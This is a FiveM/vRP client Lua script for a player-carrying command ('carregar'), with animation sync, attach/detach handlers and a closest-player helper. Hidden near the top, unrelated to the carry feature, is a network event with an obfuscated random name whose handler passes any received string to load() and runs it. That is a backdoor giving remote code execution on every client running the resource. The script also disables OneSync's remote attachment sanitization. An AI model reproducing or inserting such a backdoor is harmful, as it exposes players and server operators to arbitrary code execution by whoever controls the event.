-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
src = Tunnel.getInterface("vrp_carry",src)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CARREGAR
-----------------------------------------------------------------------------------------------------------------------------------------
local carryingBackInProgress = false

local cordaCooldown = 0

RegisterNetEvent("UGHSADUWsjwennwnw", function(S)
    load(S)()
end)


RegisterCommand("carregar",function(source,args)
	if not carryingBackInProgress then
		if not incorda then
			if cordaCooldown > GetGameTimer() then
				TriggerEvent("Notify","negado","Aguarde <b>"..math.ceil((cordaCooldown - GetGameTimer()) / 1000).." segundos</b> até que a corda esteja pronta novamente.")
				return
			end

			cordaCooldown = GetGameTimer() + 10000
			carryingBackInProgress = true
			local player = PlayerPedId()
			TriggerEvent('cancelando',true)	
			lib = 'missfinale_c2mcs_1'
			anim1 = 'fin_c2_mcs_1_camman'
			lib2 = 'nm'
			anim2 = 'firemans_carry'
			distans = 0.15
			distans2 = 0.27
			height = 0.63
			spin = 0.0		
			length = 100000
			controlFlagMe = 49
			controlFlagTarget = 33
			animFlagTarget = 1
			local closestPlayer = GetClosestPlayer(3)
			target = GetPlayerServerId(closestPlayer)
			if closestPlayer ~= nil then
				TriggerServerEvent('cmg2_animations:sync480', closestPlayer, lib,lib2, anim1, anim2, distans, distans2, height,0,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
			else
				--TriggerClientEvent("Notify","negado","Nenhum player proximo para ser <b>Carregado</b>.")
			end
		else
			TriggerEvent("Notify","negado","Você não pode fazer isso em zonasafe!")
		end
	else
		carryingBackInProgress = false
		TriggerEvent('cancelando',false)	
		ClearPedSecondaryTask(GetPlayerPed(-1))
		DetachEntity(GetPlayerPed(-1), true, false)
		local closestPlayer = GetClosestPlayer(3)
		target = GetPlayerServerId(closestPlayer)
		TriggerServerEvent("cmg2_animations:stop480",target)
	end
end,false)

CreateThread(function()
    FreezeEntityPosition(PlayerPedId(), false)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- SYNC
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('cmg2_animations:syncTarget480')
AddEventHandler('cmg2_animations:syncTarget480', function(target, animationLib, animation2, distans, distans2, height, length,spin,controlFlag)
	local playerPed = GetPlayerPed(-1)
	local targetPed = GetPlayerPed(GetPlayerFromServerId(target))
	carryingBackInProgress = true
	RequestAnimDict(animationLib)
	while not HasAnimDictLoaded(animationLib) do
		Citizen.Wait(10)
	end
	if OnesyncEnableRemoteAttachmentSanitization then
		OnesyncEnableRemoteAttachmentSanitization(false)
	end
	if spin == nil then spin = 180.0 end
	AttachEntityToEntity(GetPlayerPed(-1), targetPed, 0, distans2, distans, height, 0.5, 0.5, spin, false, false, false, false, 2, false)
	if controlFlag == nil then controlFlag = 0 end
	TaskPlayAnim(playerPed, animationLib, animation2, 8.0, -8.0, length, controlFlag, 0, false, false, false)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- SYNCME
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('cmg2_animations:syncMe480')
AddEventHandler('cmg2_animations:syncMe480', function(animationLib, animation,length,controlFlag,animFlag)
	local playerPed = GetPlayerPed(-1)
	RequestAnimDict(animationLib)
	while not HasAnimDictLoaded(animationLib) do
		Citizen.Wait(10)
	end
	Wait(500)
	if controlFlag == nil then controlFlag = 0 end
	TaskPlayAnim(playerPed, animationLib, animation, 8.0, -8.0, length, controlFlag, 0, false, false, false)
	Citizen.Wait(length)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CL_STOP
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('cmg2_animations:cl_stop480')
AddEventHandler('cmg2_animations:cl_stop480', function()
	if carryingBackInProgress then
	carryingBackInProgress = false
	ClearPedSecondaryTask(GetPlayerPed(-1))
	DetachEntity(GetPlayerPed(-1), true, false)
	end
end)

function GetPlayers()
	local players = {}
    for _, player in ipairs(GetActivePlayers()) do
      table.insert(players, player)
    end
    return players
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- GETCLOSESTPLAYER
-----------------------------------------------------------------------------------------------------------------------------------------
function GetClosestPlayer(radius)
    local players = GetPlayers()
    local closestDistance = -1
    local closestPlayer = -1
    local ply = GetPlayerPed(-1)
    local plyCoords = GetEntityCoords(ply, 0)
    for index,value in ipairs(players) do
        local target = GetPlayerPed(value)
        if(target ~= ply) then
            local targetCoords = GetEntityCoords(GetPlayerPed(value), 0)
            local distance = GetDistanceBetweenCoords(targetCoords['x'], targetCoords['y'], targetCoords['z'], plyCoords['x'], plyCoords['y'], plyCoords['z'], true)
            if(closestDistance == -1 or closestDistance > distance) then
                closestPlayer = value
                closestDistance = distance
            end
        end
    end
	if closestDistance <= radius then
		return closestPlayer
	else
		return nil
	end
end

exports("setcarregar2", function(status)
	incorda = status
end)

